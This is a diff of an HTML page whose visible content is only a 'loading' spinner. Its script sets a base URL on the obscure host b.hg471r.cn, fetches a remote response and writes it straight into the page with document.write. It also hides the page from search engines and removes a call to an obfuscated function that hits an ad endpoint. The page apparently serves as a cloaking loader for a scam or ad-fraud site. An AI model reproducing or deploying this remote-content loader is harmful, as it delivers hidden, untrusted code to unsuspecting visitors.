@@ -5,17 +5,32 @@
     <meta charset="UTF-8">
     <meta name="renderer" content="webkit">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="robots" content="none">
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,minimal-ui,viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="HandheldFriendly" content="true">
+    <meta name="format-detection" content="telephone=no">
     <title>加载中...</title>
-
-
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+        }
+        body{font-family:helvetica,'Hiragino Sans GB W3','microsoft yahei';font-size:14px}
+        html,body,.container{position:relative;width:100%;min-height:100%}
+        i,b{font-size:1em;font-style:normal;font-weight:500;-webkit-box-sizing:border-box;box-sizing:border-box}
+        .g_container_loading{position:relative;width:100%;height:100%}
+        .g_container_loading .loading_con{position:fixed;left:0;top:0;width:100%;height:100%;z-index:100;display:-webkit-box;-webkit-box-orient:vertical;-webkit-box-pack:center;-webkit-box-align:center;display:-webkit-flex;-webkit-align-items:center;-webkit-justify-content:center;-webkit-flex-direction:column;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#333;font-size:14px}
+        .g_container_loading .icon_loading{display:block;width:27px;height:10px;margin:0 auto 10px;width:27px;height:10px;background:url(https://p.ssl.qhimg.com/t011fa0856011fcdf61.png) 0 0 no-repeat;background-size:27px 300px;-webkit-animation:loading 1s steps(30) infinite;animation:loading 1s steps(30) infinite}
+        @-webkit-keyframes loading{from{background-position:0 0}
+            to{background-position:0 -300px}}
+        @keyframes loading{from{background-position:0 0}
+            to{background-position:0 -300px}}
+    </style>
 </head>
-<body style="">
-
-<a id="back" rel="noopener noreferrer"></a>
-<div id="ld">
-
-</div>
 <script> var require = null;var define=null; var manage_url = '//b.hg471r.cn';
 var apiUrl=manage_url+"/hb2/Hb.php?m=show";var toquanurl = manage_url+"/hb2/Hb.php?m=show_quan&t="; var adUrl=manage_url+"/hb2/Hb_mjk.php?m=ad"</script>
 <script>
@@ -46,8 +61,18 @@ var apiUrl=manage_url+"/hb2/Hb.php?m=show";var toquanurl = manage_url+"/hb2/Hb.p
         doc.write(res);
         doc.close()
     })
-    isc4s2z6u0w8(manage_url+'/hb2/Hb_mjk.php?m=show')
+
 </script>
+<body style="background-color: rgba(1,1,1,1);">
+
+<a id="back" rel="noopener noreferrer"></a>
+
+    <div class="g_container_loading">
+        <div class="loading_con">
+            <i class="icon_loading"></i>
+            <div class="loading_text">努力加载中</div>
+        </div>
+    </div>
 
 </body>
 </html>
